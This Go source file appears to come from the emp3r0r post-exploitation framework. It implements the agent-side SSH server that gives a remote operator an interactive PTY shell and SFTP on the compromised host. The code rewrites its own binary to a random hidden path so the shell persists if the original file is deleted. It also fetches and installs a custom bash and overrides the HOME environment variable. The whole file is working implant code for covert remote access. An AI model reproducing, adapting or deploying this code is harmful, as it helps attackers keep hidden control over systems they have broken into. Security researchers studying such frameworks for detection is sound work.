package agent

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/creack/pty"
	"github.com/gliderlabs/ssh"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func setWinsize(f *os.File, w, h int) {
	winsize := &pty.Winsize{
		Rows: uint16(h),
		Cols: uint16(w),
	}
	if err := pty.Setsize(f, winsize); err != nil {
		log.Printf("error resizing pty: %s", err)
	}
}

// SSHD start a ssh server to provide shell access for clients
// the server binds local interface only
func crossPlatformSSHD(shell, port string, args []string) (err error) {
	// if we're running from loader, elvsh is not available
	run_from_loader := os.Getenv("LD") == "true"
	if run_from_loader && shell == "elvsh" {
		shell = "bash"
		if !util.IsCommandExist(shell) {
			shell = "sh"
		}
	}

	// CC doesn't know where the agent root is, so we need to prepend it
	if strings.HasPrefix(shell, util.FileBaseName(RuntimeConfig.AgentRoot)) {
		shell = fmt.Sprintf("%s/%s", filepath.Dir(RuntimeConfig.AgentRoot), shell)
	}

	exe, err := exec.LookPath(shell)
	if err != nil && shell != "elvsh" {
		res := fmt.Sprintf("%s not found (%v), aborting", shell, err)
		log.Print(res)
		return
	}
	ssh_server := ssh.Server{
		Addr: "127.0.0.1:" + port,
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": SftpHandler,
		},
	}

	ssh_server.Handle(func(s ssh.Session) {
		// in case agent binary is deleted, elvsh will need a new one
		new_exe := fmt.Sprintf("%s/.%s", RuntimeConfig.UtilsPath, util.RandStr(22))
		if shell == "elvsh" {
			// write process exe again
			log.Printf("elvsh: rewriting process exe to %s", new_exe)
			err = CopySelfTo(new_exe)
			if err != nil {
				err = fmt.Errorf("%s not found (%v), aborting", exe, err)
				log.Print(err)
			}
			exe = new_exe
		}
		cmd := exec.Command(exe, args...)
		cmd.Env = os.Environ()

		// we have a special bashrc and we would like to apply it
		if shell == "bash" {
			custom_bash := RuntimeConfig.UtilsPath + "/bash"
			if !util.IsFileExist(custom_bash) {
				log.Printf("sshd: custom bash not found, downloading...")
				VaccineHandler()
			}
			err = ExtractBash()
			if err != nil {
				log.Printf("sshd: extract built-in bash: %v", err)
			}
			cmd = exec.Command(exe)
			bash_home := RuntimeConfig.UtilsPath // change home to use our bashrc
			os.Setenv("HOME", bash_home)
			os.Setenv("SHELL", cmd.Path)
			cmd.Env = os.Environ()
		}

		// we also have a more special Evlsh
		if shell == "elvsh" {
			cmd = exec.Command(exe)
			cmd.Env = append(os.Environ(), "ELVSH=true")
		}

		// remove empty arg in cmd.Args
		var tmp_args []string
		for _, arg := range cmd.Args {
			if strings.TrimSpace(arg) != "" {
				tmp_args = append(tmp_args, arg)
			}
		}
		cmd.Args = tmp_args

		log.Printf("sshd execute: %v, args=%v, env=%s", cmd, cmd.Args, cmd.Env)

		ptyReq, winCh, isPTY := s.Pty()
		if isPTY {
			log.Printf("Got an SSH PTY request: %s", ptyReq.Term)
			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
		} else {
			log.Print("Got an SSH request")
			return
		}
		f, err := pty.Start(cmd)
		if err != nil {
			err = fmt.Errorf("Start shell with PTY failed: %v\n", err)
			io.WriteString(s, err.Error())
			log.Print(err)
			return
		}
		os.Remove(new_exe) // clean up our copy as elvsh should be running and it's no longer needed

		go func() {
			for win := range winCh {
				log.Printf("set pty size to %dx%d", win.Width, win.Height)
				setWinsize(f, win.Width, win.Height)
			}
		}()
		go func() {
			defer func() {
				log.Printf("Closing PTY file: %s", f.Name())
				f.Close()
				if cmd.Process != nil {
					cmd.Process.Kill()
					log.Printf("Killed PTY process %d", cmd.Process.Pid)
				}
			}()
			_, err = io.Copy(f, s) // stdin
			if err != nil {
				err = fmt.Errorf("error: IO copy from SSH to PTY: %v\n", err)
				log.Print(err)
				io.WriteString(s, err.Error())
			}
		}()
		if !util.IsPIDAlive(cmd.Process.Pid) {
			err = fmt.Errorf("PTY process %d died prematurely\n", cmd.Process.Pid)
			log.Print(err)
			io.WriteString(s, err.Error())
		}
		_, err = io.Copy(s, f) // stdout
		if err != nil {
			err = fmt.Errorf("error: IO copy from PTY to SSH: %v\n", err)
			log.Print(err)
			io.WriteString(s, err.Error())
		}
		cmd.Wait()
	})

	log.Printf("Starting SSHD on port %s...", port)
	return ssh_server.ListenAndServe()
}
